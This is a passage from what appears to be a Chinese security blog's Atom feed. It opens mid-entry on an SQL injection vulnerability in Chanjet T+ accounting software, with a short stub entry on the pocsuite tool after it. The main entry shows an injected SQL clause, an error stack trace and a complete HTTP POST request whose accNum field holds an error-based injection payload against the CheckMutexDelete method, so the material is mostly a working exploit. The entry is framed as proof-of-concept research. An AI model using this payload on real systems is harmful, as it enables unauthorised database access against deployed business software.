注入后</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> </span><br><span class="line">    (<span class="keyword">select</span> @<span class="variable">@version</span>)<span class="operator">&gt;</span><span class="number">0</span><span class="comment">-- N&#x27; and </span></span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在执行时因为报错，返回了异常信息，也就返回了我们要执行的查询结果，异常捕捉的堆栈如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.NormalInvoke(MethodBase method, Object[] args, Boolean needFreeCuid)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.Invoke(IMessage message)\r\n   </span><br><span class="line">在 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData&amp; msgData, Int32 type)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction(String accountNum)\r\n   </span><br><span class="line">在 Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(String url, String accNum, String functionTag)</span><br></pre></td></tr></table></figure><p>使用 dnSpy 反编译之后可以看到，<strong>CheckMutexDelete</strong> 方法也可以用于该漏洞，需要在 请求体添加 <code>dsName</code> 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutexDelete HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;, &quot;dsName&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：畅捷通T+ SQL 注入漏洞(含POC)&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【POC】pocsuite 用法</title>
    <link href="http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/</id>
    <published>2024-04-01T08:26:20.115Z</published>
    <updated>2024-04-01T08:27:50.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：pocsuite 工具的用法整理</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/162868.html">工具| PocSuite 使用介绍 - FreeBuf网络安全行业门户</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：pocsuite 工具的用法整理&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/column/162868.html&quot;&gt;工具| PocSuite 使用介绍 - FreeB</summary>
      
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="Python" scheme="http://example.com/categories/B-Code/Python/"/>
    
    
  </entry>
  
</feed>
